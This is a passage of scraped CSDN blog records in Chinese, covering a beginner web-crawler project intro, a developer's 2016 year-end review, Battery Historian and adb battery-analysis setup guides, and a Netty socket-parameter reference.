http://blog.csdn.net/feiduclear_up/article/details/46514791 \n2. http://blog.csdn.net/mchenys/article/details/51541306", "time": "2018_08_14_11_12_45", "link": "https://blog.csdn.net/ccg_201216323/article/details/53381391", "title": "2：Android5.0中Material Dialog、SwipeRefreshLayout等控件的使用。"}
{"timestamp": "2018_08_14_11_12_47", "desc": "最近学习开发linux下的爬虫，主要是参考了该博客及其他一些网上的资料。网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。目前有一些比较出名的一些开源爬虫，开源爬虫Labin，Nutch，Neritrix介绍和对比见这里 \n 下面说的爬虫是作为一个新手来说的，高手请勿喷 \n（1）该爬虫就功能来说比较单一，但是作为一个个人的学习项目来说又是相对完整的。 \n（2）该爬虫可优化的地方太多，很多的方案不一定是最好的，所以该爬虫仅仅适合于新手的学习 \n（3）这个算是一个完整的项目，基于linux的，虽然是C风格的，但是里面用到了很多C++的东西，特别是几种容器 \n（4）因为我也以此项目来学习的，我觉得作为学习项目还是具有一定的学习价值： \n  通过此项目，我们将学会几种思想：软件框架思想，代码复用思想， 迭代开发思想，增量开发思想 \n  通过此项目，我们将会掌握并巩固以下技术要点： \n1、Linux进程及调度 2、Linux服务 3、信号 4、Socket编程 5、Linux多任务 6、文件系统 7、正则表达式 \n8、shell脚本 9、动态库 \n另外我们还会学到一些额外的的知识： \n1、  如何使用HTTP协议 2、  如何设计一个系统 3、  如何选择和使用开源项目 4、  如何选择I/O模型 5、  如何进行系统分析 \n6、  如何进行容错处理 7、  如何进行系统测试 8、  如何对源代码进行管理", "time": "2018_08_14_11_12_47", "link": "https://blog.csdn.net/l979951191/article/details/48650657", "title": "一只简单的网络爬虫（基于linux C/C++）————开篇"}
{"timestamp": "2018_08_14_11_12_47", "desc": "今天是2016年12月31日，是2016年的最后一天，马上就是2017年了，祝阅读我文章的各位朋友新年快乐、身体健康、工作顺利，新年快乐、身体健康、工作顺利，新年快乐、身体健康、工作顺利，重要的事情说三遍，哈哈。\n\n本篇文章是我第一次写个人年终总结，当然以后每年都会坚持写下去的。截至今天为止，我来北京工作已经快一年半了，对北京的快节奏的生活已经非常的适应了。2016年，是我人生中的一个转折点，这一年对我来说有两件事情非常的重要，第一就是工作，第二就是大学毕业，当了16年的学生，在这一年我终于毕业了，没有选择继续往上考研深造，而是选择踏入社会，做社会中普普通通的上班族，每天上班下班，挤公交挤地铁。\n\n\n\n2016我的工作\n\n从2015年11月份开始，我一直都在北京工作，就职于某集团互联网项目事业部，之前一直在集团总部大楼办公，但由于事业部人数增多，事业部就单独出来，成为了集团的子公司，然后就一直在这个子公司工作，工作职位就是Android开发程序员，一直到现在。\n\n在工作这方面，经历这一年多的历练，自我认为个人编程技术有很大的提高，这是我工作中最大的收获，与同事相处的也非常的融洽，在工作中遇到问题和同事相互商量解决。随着在Android开发这个行业的发展，我发现程序员这个职业是一个特别需要不停学习的，因为软件这方面的新技术更新的太快了，举个鲜明的例子来说就是，你可能对XP系统还不能熟练使用的时候，但是Win10系统已经更新了，这中间差还差了两大截呢，所以说要想在软件这个行业发展下去，那就要不停地学习，技术的学习不是言传身教就会的，它需要我们在自我实践中去探索、发现。\n\n虽然我现在还不是一个工作经验非常丰富的android程序员，但是我愿意在这条道路上通过自己的努力去提高自己的技术，，从而获得更好的公司待遇，为公司做出更好的产品，要问我为什么这么自信能提高自己的技术，因为我是河南人，一个经历过河南高考的莘莘学子，我相信自己在学习能力上还是可以的。\n\n在这一年多的工作中，我也发现了软件这个行业的一些现状，下面来谈谈我看法。\n\n\n  工作年限长不等于工作能力强\n\n\n在这个行业中从（以Android为例），工作两三年的程序员，虽然自诩有2到3年的工作经验，但是我发现，有些人他们的编程技术也没有真的很牛叉，写出来的代码也都是一般般，对当下的流行的技术也没有过多的了解，然而他们的工资却挺高的，这就暴露出了一个问题，企业在用人的时候过多的通过衡量一个人的工作经验来判断这个人的工作能力 \n,虽然工作经验长，技术可能会强，但这两者之间没有必然的因果关系。\n\n\n  个人学历还是挺重要的\n\n\n程序员虽然是个技术工种，每天的工作就是写代码，有些人可能会想，我的个人技术强，工作经验丰富就行了，与学历高低没太大关系，但是我认为，要想在程序员这个行业发展，最低的学历也要是大专，不然在求职的时候，人事的这一关你都过不去，更别提能进入技术面试这一关了，这里我的学历指的可是第一学历哦。总结一句话就是，学历还是要有的，越高越好。\n\n\n  企业有点歧视培训出来的程序员，尤其是小公司\n\n\n现在社会上有大量的软件培训结构，他们就相当于太上老君的炼丹炉，在里面经过七七四十九天就可以获得超能力，就可以进入企业去做程序员的工作，但是有的企业一听这个应聘者是培训出来的，就有点歧视的眼光，会认为这些学生大学不好好学习，毕业了找个机构学习学习出来工作。我的看法是，确实有这样的例子，但是还是有好多像我这样的，大学本身学的就是计算机网络相关的专业，大学接触了许多的编程语言，有比较扎实的编程基础，但在当今的教育体制下，他们为了就业，只能进入培训机构，系统强化自己的技能，否则大学毕业生该怎么顺利的就业，国家每年所报道的大学生就业率是多少多少，这里面又有多少是真实数据呢？个人认为水分很大。如果能通过好的培训机构学到专业的技术，这未尝不是一种好的方式，这个社会谁不需要技能培训呢！！！\n\n\n  公司文化与员工利益\n\n\n每个公司都倡导自己的公司文化，尤其是一些企业，企业文化表现出了企业的核心价值观，每一个企业虽然都是以赚钱为根本目的，作为求职者的我们和企业只是雇佣与被雇佣的关系，但是我的看法是，一个不考虑员工利益、一个只知道榨取员工利益的公司，其员工是不会为其全身心工作的，不管这个公司在怎么有钱，到最后都是打水漂，更别提赚钱了。\n\n2016年我还有一个非常大的改变，就是此刻的我斗志昂扬，每天每周都有计划的在学习自己不会的东西，现在的我的学习状态，已经有我高三高考时候的感觉了，每天过的很充实，很饱满。看博客，看视频、写博客、写代码。。。在接下来的2017年中，我会继续延续这种状态，工作、学习之余也会去健身房锻炼自己的身体，毕竟身体才是革命的本钱。\n\n\n\n2016我毕业了\n\n在2016年，我顺利的从华北水利水电大学网络工程专业毕业，并取得工学学士学位，虽然我放弃了考研（并不是我学习不好）选择工作，但是我从没后悔过。这里特别要记录感谢一下大学四年执教的各位老师们，祝你们身体健康，工作顺利。大学老师的工作也是非常累，家庭和工作要兼顾，特别要感谢的就是在我最后毕业的时候给予帮助的刘扬老师、李素萍老师、王庆江老师、王畅导师、韩红玲老师、马斌老师，没有他们在学习和毕业设计上的帮助，我也不能非常顺利的毕业。\n\n因为专业的缘故，原本的我想做网络相关的工作，好好的学习CCNA、CCNP、CCIE，但网络这个行业现在本科毕业出去工作不好，且收入还低，考虑到大学学习过的编程语言加上现实的情况使我选择了程序员，而如今，我也非常喜欢自己现在的这份工作，我也愿意通过自己的努力在这条道路上走的持久、长远。\n\n明天就是2017年，这里对我身边的亲朋好友送去祝福，祝工作的同学朋友们们工作顺利，赚大钱，祝在上研究生的同学们学习进步，同时祝大家新年快乐。\n\n\n\n2017开启新的征程\n\n2017年，我将继续北漂之路，为我2018年去杭州工作发展做铺垫。下面大致写出2017年我的计划，看到2017年底我有哪些方面没有完成。\n\n\n  计划1：学习\n\n\n自己在Android这块还有许多的不足，有一些新的技术自己还不会，希望自己在2017年可以早早的学会这些新技术，同时也希望能够接触别的方面的Android开发，赶上Android新技术的步伐，巩固自己现有的技术，做一个能力王者。\n\n\n  计划2：工作\n\n\n对于工作，我始终都是兢兢业业，尽自己最大的能力去完成领导安排的工作，希望2017年提高自己与人打交道的能力，在工作中认识更多的朋友，不油腔滑调，不阳奉阴违，不溜须拍马，做好自己的分内工作，做一个靠谱的人。\n\n\n  计划3：网站\n\n\n基于兴趣为出发点，2017年我将着手开发自己的网站，不单单是因为兴趣，更希望通过做网站的方式，来提高自己在Web这块的能力，当然这项工作我会找我大学的同学来一起完成。\n\n\n  计划4：健身\n\n\n同时拥有浩沙健身卡和壹健身卡的我，在2017年除了工作学习之外会经常去健身房锻炼自己的身体，希望自己的体重能从80Kg减到70Kg，肚子上的赘肉能够编程肌肉，能够拥有6块腹肌，倒三角的肌肉男。\n\n\n  计划5：爱情\n\n\n和自己喜欢的人，好好的谈恋爱，个人年纪也不小了，到了适婚年龄了，需要好好打算打算了，哈哈哈哈哈。\n\n2017年的计划安排主要就是上面五部分，在2017年我也会付出自己的行动，所有的这些付出都是为了2018年我去杭州工作能有一个更好的生活，虽然当下互联网不景气，有许多互联网公司都倒闭了，工作也不好找，但是这都不是我们所能主宰的，我们能主宰的就是自己，为自己的生活奋斗。\n\n从2015年开始在CSDN写博客，中间有一段时间没写，到最近重新捡起博客，来写、来发表自己的文章，这个过程中我发现，把自己学过的东西整理成笔记写下来、记录下来非常的有必要，回想大学学的C、C++、java、网络编程、CCNA等专业课程，当时是学会了，但到现在基本忘的差不多了，如果当初学习的时候能够自己做笔记记录下来，那现在的我也应该是另外一种状态了。所以希望阅读到我的这篇文章的朋友们，如果你是做技术的，最好养成一个写笔记的习惯，不单单方便自己查询，也可以装X使用。我的最新的博客会通过下面两个渠道发布，欢迎关注。\n\n文章的最后再送上对大家的祝福，2017年祝大家新年快乐。\n\n\n  欢迎访问201216323.tech来查看我的CSDN博客。\n  \n  欢迎关注我的个人微信公众号,快速查看我的最新文章。", "time": "2018_08_14_11_12_47", "link": "https://blog.csdn.net/ccg_201216323/article/details/53957644", "title": "过去的2016，期待的2017，我与北京继续相伴。"}
{"timestamp": "2018_08_14_11_12_48", "desc": "欢迎Follow我的GitHub, 关注我的CSDN.\n\n\n\n\n本文的合集已经编著成书，高级Android开发强化实战，欢迎各位读友的建议和指导。在京东即可购买：https://item.jd.com/12385680.html\n\n\n\n在Android项目中, 较难监控应用的电量消耗, 但是用户却非常关心手机的待机时间. 过度耗电的应用, 会遭到用户无情的卸载, 不要存在侥幸心理, 给竞品带来机会. 因此, 我们需要研究应用的耗电量, 并进行优化. 本文讲解一下Battery Historian, 是一款由Google提供的Android系统电量分析工具. 在网页中展示手机的电量消耗过程, 输入电量分析文件, 显示消耗情况. 最后提供一些电量优化的方法, 可供参考.\n\n1. 安装Go\n\nBattery Historian是Go语言开发, 需要安装Go编译环境.  \n下载Mac版的安装包, 执行完成, 检查Go版本\n\n\n\n➜  ~ go version\ngo version go1.6 darwin/amd64\n\n在.bash_profile中, 设置Go语言变量\n\n\n\n#Go Settings\nexport GOPATH=/Users/.../Workspace/GoWorkspace\nexport GOBIN=/Users/.../Workspace/GoWorkspace/bin\n\n\n  GOPATH源码地址. GOBIN生成地址, 推荐$GOPATH/bin. \n   执行source .bash_profile, 应用profile配置.\n\n\n新建src文件夹, 添加HelloWorld文件hello.go.\n\n\n\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Printf(\"hello, world\\n\")\n}\n\n安装hello.go\n\n\n\ngo install hello.go\n\n执行\n\n\n\n$GOBIN/hello\n\n如果显示hello, world, 即表示安装完成.\n\n\n\n\n\n2. Battery Historian\n\n在安装Battery Historian时, 需要提前安装wget.\n\n\n\nsudo brew install wget\n\n按照Battery Historian的GitHub文档执行操作即可.\n\n\n\ngo get -u github.com/golang/protobuf/proto\ngo get -u github.com/golang/protobuf/protoc-gen-go\ngo get -u github.com/google/battery-historian/...\ncd $GOPATH/src/github.com/google/battery-historian\nbash setup.sh\n# 运行Go脚本, 默认端口9999 \ngo run cmd/battery-historian/battery-historian.go [--port <default:9999>]\n\n\n\n启动命令\n\n\n\ncd $GOPATH/src/github.com/google/battery-historian\ngo run cmd/battery-historian/battery-historian.go [--port <default:9999>]\n\n在浏览器中, 输入http://localhost:9999/, 即可启动电量检测页面.\n\n\n\n\n  在启动页面时, 可能需要连接VPN, 访问Google信息. \n\n\n\n\n3. 分析\n\n获取手机的电量文件, 导出到根目录, 以备Battery Historian使用.\n\n\n\nadb bugreport > bugreport.txt\n\n使用Battery Historian的网页加载bugreport.txt文件.\n\n\n  如遇到一些问题, 重新提交bugreport.txt文件.\n\n\n系统状态\n\n\n\n应用状态(简书)\n\n\n\n\n\n\n\n4. 电量优化\n\n根据Battery Historian的电量提示信息, 消耗电量包含 \n唤醒锁\\SyncManager同步管理器\\音视频\\流量.\n\n优化方式: \n(1) 检查全部唤醒锁, 是否存在冗余或者无用的位置. \n(2) 集中相关的数据请求, 统一发送; 精简数据, 减少无用数据的传输. \n(3) 分析和统计等非重要操作, 可以在电量充足或连接WIFI时进行, 参考JobScheduler. \n(4) 精简冗余的服务(Service), 避免长时间执行耗电操作. \n(5) 注意定位信息的获取, 使用后及时关闭.\n\n\n\n电量优化并不是很难, 但需要对业务非常熟悉, 了解一些耗电操作的使用情况, 及时优化. 只有给用户精致的体验, 用户才能更加喜欢我们的应用, 这就是服务型社会的本质.\n\n本文地址: http://blog.csdn.net/caroline_wendy/article/details/50769915\n\nThat’s all! Enjoy it!", "time": "2018_08_14_11_12_48", "link": "https://blog.csdn.net/caroline_wendy/article/details/50769915", "title": "使用BatteryHistorian分析和优化应用电量"}
{"timestamp": "2018_08_14_11_12_48", "desc": "综述\n环境配置\n安装go环境\n\n\n安装gitpythonjava\n下载Battery Historian\nBattery Historian常见问题\n下载脚本失败\nbattery Historian无法加载问题\nsubmit按钮不显示\n\n\n最终效果图\n\n\n\n\n\n\n\n综述\n\n不知道是否记得，Google 2016 I/O上向人们展示的Battery Historian升级版（V2.0）。爽爽的。这里介绍下个人在进行配置过程中的种种问题，同时也是一个分享问题的过程。\n\n\n\n环境配置\n\n这部分包括go/java/python/git的安装与配置。注意下python要求2.7版本的，go在安装的时候尤其要留意环境变量的配置(这里以linux系统为例)\n\n\n\n安装go环境\n\n详细的go安装步骤，可以参考Go Install。选择正确的版本进行安装。安装成功之后参照如下配置环境变量 \nGOROOT是指安装go的根目录\n\n\n\nexport GOROOT=$HOME/go\nexport PATH=$PATH:$GOROOT/bin\n\n我也尝试通过下载go的源码，解压并配置环境变量；但最终混淆了了GOROOT/GOBIN/GOPATH这几个环境变量。所以，我才用的是在线安装。如下操作\n\n\n\nsudo add-apt-repository ppa:ubuntu-lxc/lxd-stable\nsudo apt-get update\nsudo apt-get install golang\n\n通过在线方式安装之后，还是要稍微配置一下环境变量。这里的GOPATH是指稍后需要clone的battery historian的所在目录；GOBIN就是固定的为$GOPATH/bin\n\n\n\nexport GOPATH=$HOME/04_workspace/05_go_workspace\nexport GOBIN=$GOPATH/bin\nexport PATH=$PATH:$GOBIN\n\n完成之后在稍微测试下，如下图所示 \n\n\n\n\n安装git/python/java\n\npython就不多说了。Linux版本自带，再次说明下，要2.7版本。对于java和git可以在线安装。比较简单，这里不在描述\n\n\n\n下载Battery Historian\n\n直接通过下面的代码从github上下载。该过程可能回持续一段时间（视网络情况)\n\n\n\ngo get -d -u github.com/google/battery-historian/...\n\n下载完成之后，进入到特定的目录，获得必要的依赖然后运行battery historian服务\n\n\n\n$ cd $GOPATH/src/github.com/google/battery-historian\n\n# Compile Javascript files using the Closure compiler\n$ go run setup.go\n\n# Run Historian on your machine (make sure $PATH contains $GOBIN)\n$ go run cmd/battery-historian/battery-historian.go [--port <default:9999>]\n\n这里需要注意下go run setup.go在执行过程中耗时更长，因为要下载一些js库，而且还是从google处下载。需要梯子，当然也不要着急，go run setup.go主要是更新third_xxx目录喜下的代码。可以通过这里下载我的代码，然后通过比较软件合并一下。 \n完成之后，在浏览器中输入 http://localhost:9999 还不能即可访问battery historian的服务；因为这是在天朝，各种墙啊。\n\n\n\nBattery Historian常见问题\n\n\n\n下载脚本失败\n\n如果在执行go run setup.go时提示失败，可以下载博主的，然后通过合并软件比对一下，点击这里下载（baidu link)\n\n\n\nbattery Historian无法加载问题\n\n这基本上可以确定是由于墙引起的的；由于battery historian需要访问一一些公共的前端库，而这些库默认又是访问google的；解决方案有两个 \n 1. 手动更换。可以在浏览器加载http://localhost:9999 时按下F12 选择 Console查看有那些资源没有加载成功，然后在go代码里面搜到（github.com/google/battery-historian/ 目录下）然后替换成国内的，比如新浪的 lib.sinaapp.com \n 2. 使用浏览器插件，自动替换，参考 ReplaceGoogleCDN\n\n\n\nsubmit按钮不显示\n\n提交按钮不显示，没有提交按钮。这个问题本质上也是由于js没有夹杂成功引起的。博主也被右侧的Submit困惑了好久，好久，最宗原来是js脚本加载的问题。。 \n \n鉴于最近很多小伙伴一直在咨询如何处理submit按钮不显示问题；其实这里有说明，只是不太明显。不显示submit按钮的本质是web某些资源没有加载出来，为什么没有加载出来，这是因为其中的一些资源貌似被墙了。只要解决了墙的问题，submit俺就的问题也就迎刃而解了。 \n最简单的解决submit 按钮不显示的方法\n\n\n想办法翻f***k墙\n想办法将无法加载的资源替换为可以加载的资源（参考 ReplaceGoogleCDN）\n\n\n最终效果图", "time": "2018_08_14_11_12_48", "link": "https://blog.csdn.net/peng_cao/article/details/52632360", "title": "Android 电量分析之Battery Historian配置"}
{"timestamp": "2018_08_14_11_12_48", "desc": "通用参数说明\n\n\n\n\n  netty参数\n  说明\n\n\n\n  CONNECT_TIMEOUT_MILLIS\n  连接超时毫秒数，默认值30000毫秒即30秒。\n\n\n  MAX_MESSAGES_PER_READ\n  一次Loop读取的最大消息数，对于ServerChannel或者NioByteChannel，默认值为16，其他Channel默认值为1。默认值这样设置，是因为：ServerChannel需要接受足够多的连接，保证大吞吐量，NioByteChannel可以减少不必要的系统调用select。\n\n\n  WRITE_SPIN_COUNT\n  一个Loop写操作执行的最大次数，默认值为16。也就是说，对于大数据量的写操作至多进行16次，如果16次仍没有全部写完数据，此时会提交一个新的写任务给EventLoop，任务将在下次调度继续执行。这样，其他的写请求才能被响应不会因为单个大数据量写请求而耽误。\n\n\n  ALLOCATOR\n  ByteBuf的分配器，默认值为ByteBufAllocator.DEFAULT，4.0版本为UnpooledByteBufAllocator，4.1版本为PooledByteBufAllocator。该值也可以使用系统参数io.netty.allocator.type配置，使用字符串值：”unpooled”，”pooled”。\n\n\n  RCVBUF_ALLOCATOR\n  用于Channel分配接受Buffer的分配器，默认值为AdaptiveRecvByteBufAllocator.DEFAULT，是一个自适应的接受缓冲区分配器，能根据接受到的数据自动调节大小。可选值为FixedRecvByteBufAllocator，固定大小的接受缓冲区分配器。\n\n\n  AUTO_READ\n  自动读取，默认值为True。Netty只在必要的时候才设置关心相应的I/O事件。对于读操作，需要调用channel.read()设置关心的I/O事件为OP_READ，这样若有数据到达才能读取以供用户处理。该值为True时，每次读操作完毕后会自动调用channel.read()，从而有数据到达便能读取；否则，需要用户手动调用channel.read()。需要注意的是：当调用config.setAutoRead(boolean)方法时，如果状态由false变为true，将会调用channel.read()方法读取数据；由true变为false，将调用config.autoReadCleared()方法终止数据读取。\n\n\n  WRITE_BUFFER_HIGH_WATER_MARK\n  写高水位标记，默认值64KB。如果Netty的写缓冲区中的字节超过该值，Channel的isWritable()返回False。\n\n\n  WRITE_BUFFER_LOW_WATER_MARK\n  写低水位标记，默认值32KB。当Netty的写缓冲区中的字节超过高水位之后若下降到低水位，则Channel的isWritable()返回True。写高低水位标记使用户可以控制写入数据速度，从而实现流量控制。推荐做法是：每次调用channl.write(msg)方法首先调用channel.isWritable()判断是否可写。\n\n\n  MESSAGE_SIZE_ESTIMATOR\n  消息大小估算器，默认为DefaultMessageSizeEstimator.DEFAULT。估算ByteBuf、ByteBufHolder和FileRegion的大小，其中ByteBuf和ByteBufHolder为实际大小，FileRegion估算值为0。该值估算的字节数在计算水位时使用，FileRegion为0可知FileRegion不影响高低水位。\n\n\n  SINGLE_EVENTEXECUTOR_PER_GROUP\n  单线程执行ChannelPipeline中的事件，默认值为True。该值控制执行ChannelPipeline中执行ChannelHandler的线程。如果为Trye，整个pipeline由一个线程执行，这样不需要进行线程切换以及线程同步，是Netty4的推荐做法；如果为False，ChannelHandler中的处理过程会由Group中的不同线程执行。\n\n\n\n\n\n\nSocketChannel参数\n\n\n\n\n  参数\n  说明\n\n\n\n  SO_RCVBUF\n  Socket参数，TCP数据接收缓冲区大小。该缓冲区即TCP接收滑动窗口，linux操作系统可使用命令：cat /proc/sys/net/ipv4/tcp_rmem查询其大小。一般情况下，该值可由用户在任意时刻设置，但当设置值超过64KB时，需要在连接到远端之前设置。\n\n\n  SO_SNDBUF\n  Socket参数，TCP数据发送缓冲区大小。该缓冲区即TCP发送滑动窗口，linux操作系统可使用命令：cat /proc/sys/net/ipv4/tcp_smem查询其大小。\n\n\n  TCP_NODELAY\n  TCP参数，立即发送数据，默认值为Ture（Netty默认为True而操作系统默认为False）。该值设置Nagle算法的启用，改算法将小的碎片数据连接成更大的报文来最小化所发送的报文的数量，如果需要发送一些较小的报文，则需要禁用该算法。Netty默认禁用该算法，从而最小化报文传输延时。\n\n\n  SO_KEEPALIVE\n  Socket参数，连接保活，默认值为False。启用该功能时，TCP会主动探测空闲连接的有效性。可以将此功能视为TCP的心跳机制，需要注意的是：默认的心跳间隔是7200s即2小时。Netty默认关闭该功能。\n\n\n  SO_REUSEADDR\n  Socket参数，地址复用，默认值False。有四种情况可以使用：(1).当有一个有相同本地地址和端口的socket1处于TIME_WAIT状态时，而你希望启动的程序的socket2要占用该地址和端口，比如重启服务且保持先前端口。(2).有多块网卡或用IP Alias技术的机器在同一端口启动多个进程，但每个进程绑定的本地IP地址不能相同。(3).单个进程绑定相同的端口到多个socket上，但每个socket绑定的ip地址不同。(4).完全相同的地址和端口的重复绑定。但这只用于UDP的多播，不用于TCP。\n\n\n  SO_LINGER\n  Socket参数，关闭Socket的延迟时间，默认值为-1，表示禁用该功能。-1表示socket.close()方法立即返回，但OS底层会将发送缓冲区全部发送到对端。0表示socket.close()方法立即返回，OS放弃发送缓冲区的数据直接向对端发送RST包，对端收到复位错误。非0整数值表示调用socket.close()方法的线程被阻塞直到延迟时间到或发送缓冲区中的数据发送完毕，若超时，则对端会收到复位错误。\n\n\n  IP_TOS\n  IP参数，设置IP头部的Type-of-Service字段，用于描述IP包的优先级和QoS选项。\n\n\n  ALLOW_HALF_CLOSURE\n  Netty参数，一个连接的远端关闭时本地端是否关闭，默认值为False。值为False时，连接自动关闭；为True时，触发ChannelInboundHandler的userEventTriggered()方法，事件为ChannelInputShutdownEvent。\n\n\n\n\n\n\nServerSocketChannel参数\n\n\n\n\n  参数\n  说明\n\n\n\n  SO_RCVBUF\n  已说明，需要注意的是：当设置值超过64KB时，需要在绑定到本地端口前设置。该值设置的是由ServerSocketChannel使用accept接受的SocketChannel的接收缓冲区。\n\n\n  SO_REUSEADDR\n  已说明\n\n\n  SO_BACKLOG\n  Socket参数，服务端接受连接的队列长度，如果队列已满，客户端连接将被拒绝。默认值，Windows为200，其他为128。\n\n\n\n\n\n\nDatagramChannel参数\n\n\n\n\n  参数\n  说明\n\n\n\n  SO_BROADCAST\n  Socket参数，设置广播模式。\n\n\n  IP_MULTICAST_LOOP_DISABLED:\n  对应IP参数IP_MULTICAST_LOOP，设置本地回环接口的多播功能。由于IP_MULTICAST_LOOP返回True表示关闭，所以Netty加上后缀_DISABLED防止歧义。\n\n\n  IP_MULTICAST_ADDR\n  对应IP参数IP_MULTICAST_IF，设置对应地址的网卡为多播模式。\n\n\n  IP_MULTICAST_IF\n  对应IP参数IP_MULTICAST_IF2，同上但支持IPV6。\n\n\n  IP_MULTICAST_TTL\n  IP参数，多播数据报的time-to-live即存活跳数。\n\n\n  DATAGRAM_CHANNEL_ACTIVE_ON_REGISTRATION\n  DatagramChannel注册的EventLoop即表示已激活。", "time": "2018_08_14_11_12_48", "link": "https://blog.csdn.net/JavaMoo/article/details/79372532", "title": "netty参数配置"}
{"timestamp": "2018_08_14_11_12_49", "desc": "1 数据准备\n\n\n\n1.1 先断开adb服务，然后开启adb服务\n\n\n\n（a）adb kill-server \n\n这一步很重要，因为当我们开发时做电量记录时会打开很多可能造成冲突的东西。为了保险起见我们重启adb。adb devices就会自动连接查找手机。\n\n备注：mac可以直接使用adb命令；但是windows不行，需要进入到adt下：adt-bundle-windows-x86_64-20140702\\adt-bundle-windows-x86_64-20140702\\sdk\\platform-tools 操作adb命令。\n\n\n\n（b）adb start-server\n\n重启adb。\n\n\n\n1.2 重置电池数据收集数据\n\n\n\n（c）adb shell dumpsys batterystats --enable full-wake-history\n\n（d）adb shell dumpsys batterystats --reset\n\n我们通过以上命令来打开电池数据的获取以及重置，清除干扰的数据，执行的效果如下： \n\n\n\n\n1.3 获取电量报告\n\n把数据线直接拔掉（防止数据线造成充放电数据干扰），现在做一些测试，手动或者跑一些自动化的case都行。经过一段时间后，我们重新连接手机确认adb连上了，运行下面这条命令来将bugreport的信息保存到txt文档中：\n\n\n\n（e）adb bugreport > bugreport.txt\n\n或者用下面的命令也可以，加上包名可以限制输出的数据是我们要检测的。：\n\n\n\n（e.1）adb shell dumpsys batterystats > batterystats.txt\n\n（e.2）adb shell dumpsys batterystats > com.example.android.sunshine.app > batterystats.txt\n\n注意： \njson: unsupported value: NaN  \n有人用了描述：the problem started when reset the battery stats and enabled full-wake-history。 \n解决：重启手机再试就好了。\n\n\n\n1.4 使用battery-historian工具图形化报告\n\n到此我们有两种方式分析这个文件：（historian-V1之前的版本 和historian-V2最新的版本），详细在第二、三章分析。\n\n\n\n2 historian-V1之前的版本分析方式\n\n\n\n2.1 将txt文档转化为html文件，命令如下：\n\n\n\n（f）python historian.py -a bugreport.txt > battery.html\n\n\n\n2.2 环境配置\n\n（1）python 未安装需要先安装python环境，并配置path，否则无法使用python命令。备注：mac可能不需要安装。\n\n\n\n（2）historian.py脚本是Python写的，所以需要historian脚本，从github工具开源地址：上下载这个脚本。文件在github上面的scripts目录下面，需要下载到命令行所在的目录：\n\n\n\n2.3 Google浏览器打开html文件\n\n（1）注意：浏览器显示满屏的文字+英文，无法生成图形报告，或者打开生成的HTML显示错误如下，WARNING: Visualizer disabled. If you see this message, download the HTML then open it。\n\n解决：需要使用vpn翻墙访问谷歌服务。\n\n（2）上面两条命令执行成功后，会在目录下发现两个文件bugreport.txt和battery.html，这个时候我们用google浏览器打开html文件，可以看到如下信息：\n\n \n \n \n \n\n\n\n\n2.4 Battery History报告各个参数的意义\n\n重要的参数：WiFi、wake_lock、conn、mobile_ratio(蜂窝信号)\n\n（1）横坐标 \n \n上面的30，0代表的就是秒的意思，它是以一分钟为周期，到第60秒的时候变为0。横坐标就是一个时间范围，咱们的例子中统计的数据是以重置为起点，获取bugreport内容时刻为终点。我们一共采集了多长时间的数据，图表下也有信息说明。（经其他人的反馈，这个坐标间隔是会随着时间的长度发生改变，所以要以你的实际情况为准）\n\n\n\n（2）纵坐标 \n纵坐标的数据就很麻烦了，数据量太多，一条一条来吧。\n\n（3）battery_level \n电量，可以看出电量的变化。比如上图中的数据显示刚开始电量是100%，然后在第11秒-12秒中间的某个时刻降到了99%。 \n\n\n（4）plugged \n充电状态，这一栏显示是否进行了充电，以及充电的时间范围。例如上图反映了我们在第22s插入了数据线，然后一直持续了数据采集结束。\n\n（5）screen \n屏幕是否点亮，这一点可以考虑到睡眠状态和点亮状态下电量的使用信息。\n\n（6）top \n该栏显示当前时刻哪个app处于最上层，就是当前手机运行的app，用来判断某个app对手机电量的影响，这样也能判断出该app的耗电量信息。该栏记录了应用在某一个时刻启动，以及运行的时间，这对我们比对不同应用对性能的影响有很大的帮助。\n\n（7）wake_lock* \nwake_lock 该属性是记录wake_lock模块的工作时间。是否有停止的时候等\n\n（8）running \n界面的状态，主要判断是否处于idle的状态。用来判断无操作状态下电量的消耗。\n\n（9）wake_lock_in* \nwake_lock有不同的组件，这个地方记录在某一个时刻，有哪些部件开始工作，以及工作的时间。\n\n（10）gps \ngps是否开启\n\n（11）phone_in_call \n是否进行通话\n\n（12）Sync \n是否跟后台同步. \n可以把鼠标停在某一项上面。可以看到何时sync同步 启动的，持续时间Duration多久。电池容量不会显示单一行为消耗的具体电量，这里只能显示使用电池的频率和时长，你可以看分时段的剩余电量来了解具体消耗了多少电量。 \n\n\n（13）Job \n后台的工作，比如服务service的运行。从下面图中可以看到qihoo的AppStore和鲁大师都在运行后台服务。 \n\n\n（14）data_conn* \n数据连接方式的改变，上面的edge是说明采用的gprs的方式连接网络的。此数据可以看出手机是使用2g，3g，4g还是wifi进行数据交换的。这一栏可以看出不同的连接方式对电量使用的影响。\n\n（15）status \n电池状态信息，有充电，放电，未充电，已充满，未知等不同状态。  \n这一栏记录了电池状态的改变信息。\n\n（16）phone_signal_strength \n手机信号状态的改变。  \n这一栏记录手机信号的强弱变化图，依次来判断手机信号对电量的影响。\n\n（17）health \n电池健康状态的信息，这个信息一定程度上反映了这块电池使用了多长时间。 \n 这一栏记录电池状态在何时发生改变，上面的图中电池状态一直处于good状态。\n\n（19）plug \n充电方式，usb或者插座，以及显示连接的时间。  \n这一栏显示了不同的充电方式对电量使用的影响。\n\n3 historian-V2最新的版本的方式\n\n备注：本方法由于翻墙等原因还没确定是否成功。\n\n\n\n3.1 链接参考\n\n（1）工具开源地址： https://github.com/google/battery-historian \n\n（2）Install Docker安装路径：https://docs.docker.com/engine/installation/\n\n（3）参考项目安装 Docker \nhttps://docs.docker.com/docker-for-windows/\n\nhttp://wiki.jikexueyuan.com/project/docker/installation/mac.html\n\n\n\n3.2 安装Docker环境来安装Battery History\n\n（1）描述 \n根据gitbub上面介绍，Battery History工具的安装有两种方式： \nA、通过安装Docker环境来安装。（这种方式很简单，Docker真心好用，太彪悍了！） \nB、安装GO环境、Git环境、Python、Java环境（不推荐）\n\n（2）Docker环境 \nDocker是一种容器，一般用于云计算和大数据平台。提倡的一种思想就是：软件即服务。这句话不是盖的，一句话就可以将别人发布的docker服务环境一次全部copy过来(注意是整个软件环境哦，相当于复制了一台一模一样的主机，连软件都不要安装了，全有了。彪悍吧！) 